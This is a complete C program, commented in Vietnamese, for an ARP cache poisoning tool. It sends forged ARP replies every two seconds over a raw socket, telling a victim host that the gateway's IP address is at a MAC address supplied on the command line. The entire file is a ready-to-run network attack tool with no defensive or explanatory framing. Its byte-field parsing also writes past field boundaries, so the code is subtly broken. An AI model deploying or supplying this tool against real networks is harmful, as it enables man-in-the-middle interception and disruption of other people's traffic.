#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <signal.h>

#define IP4LEN 4
#define PKTLEN sizeof(struct ether_header) + sizeof(struct ether_arp)

int sock;

void usage()
{
  puts("usage:\t./arp-poison <interface> <gateway ip> <gateway mac> <victim ip> <victim mac>");
  puts("ex:\t./arp-poison eth0 10.1.1.1 aa:bb:cc:dd:ee:ff 10.1.1.2 11:22:33:44:55:66");
  exit(1);
}

void cleanup()
{
  close(sock);
  exit(0);
}

int main(int argc, char ** argv)
{
  char packet[PKTLEN];
  struct ether_header * eth = (struct ether_header *) packet;
  struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
  struct sockaddr_ll device;
 
  if (argc < 6) {
    usage();
  }

  // Tạo socket raw với AF_PACKET để làm việc với gói tin ARP
  sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
  if (sock < 0)
    perror("socket"), exit(1);

  // Đảm bảo socket được đóng khi nhấn Ctrl+C
  signal(SIGINT, cleanup);

  // Phân tích địa chỉ MAC của máy nạn nhân từ dòng lệnh
  sscanf(argv[5], "%x:%x:%x:%x:%x:%x", (unsigned int *) &eth->ether_dhost[0],
                                       (unsigned int *) &eth->ether_dhost[1],
                                       (unsigned int *) &eth->ether_dhost[2],
                                       (unsigned int *) &eth->ether_dhost[3],
                                       (unsigned int *) &eth->ether_dhost[4],
                                       (unsigned int *) &eth->ether_dhost[5]);

  // Phân tích địa chỉ MAC của gateway từ dòng lệnh
  sscanf(argv[3], "%x:%x:%x:%x:%x:%x", (unsigned int *) &arp->arp_sha[0],
                                       (unsigned int *) &arp->arp_sha[1],
                                       (unsigned int *) &arp->arp_sha[2],
                                       (unsigned int *) &arp->arp_sha[3],
                                       (unsigned int *) &arp->arp_sha[4],
                                       (unsigned int *) &arp->arp_sha[5]);

  // Phân tích địa chỉ IP của gateway từ dòng lệnh
  sscanf(argv[2], "%d.%d.%d.%d", (int *) &arp->arp_spa[0],
                                 (int *) &arp->arp_spa[1],
                                 (int *) &arp->arp_spa[2],
                                 (int *) &arp->arp_spa[3]);

  // Phân tích địa chỉ IP của máy nạn nhân từ dòng lệnh
  sscanf(argv[4], "%d.%d.%d.%d", (int *) &arp->arp_tpa[0],
                                 (int *) &arp->arp_tpa[1],
                                 (int *) &arp->arp_tpa[2],
                                 (int *) &arp->arp_tpa[3]);

  // Thiết lập gói tin ARP
  memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);
  eth->ether_type = htons(ETH_P_ARP);

  arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
  arp->ea_hdr.ar_pro = htons(ETH_P_IP);
  arp->ea_hdr.ar_hln = ETH_ALEN;
  arp->ea_hdr.ar_pln = IP4LEN;
  arp->ea_hdr.ar_op = htons(ARPOP_REPLY);

  // Địa chỉ MAC đích (ARP Target Hardware Address - THA)
  sscanf(argv[5], "%x:%x:%x:%x:%x:%x", (unsigned int *) &arp->arp_tha[0],
                                       (unsigned int *) &arp->arp_tha[1],
                                       (unsigned int *) &arp->arp_tha[2],
                                       (unsigned int *) &arp->arp_tha[3],
                                       (unsigned int *) &arp->arp_tha[4],
                                       (unsigned int *) &arp->arp_tha[5]);

  memset(&device, 0, sizeof(device));
  device.sll_ifindex = if_nametoindex(argv[1]);
  device.sll_family = AF_PACKET;
  memcpy(device.sll_addr, arp->arp_sha, ETH_ALEN);
  device.sll_halen = htons(ETH_ALEN);

  puts("press ctrl+c to exit.");
  while (1) {
    printf("ARP Poisoning %s: %s is at %s\n", argv[1], argv[4], argv[3]);
    sendto(sock, packet, PKTLEN, 0, (struct sockaddr *) &device, sizeof(device));
    sleep(2);
  }

  return 0;
}
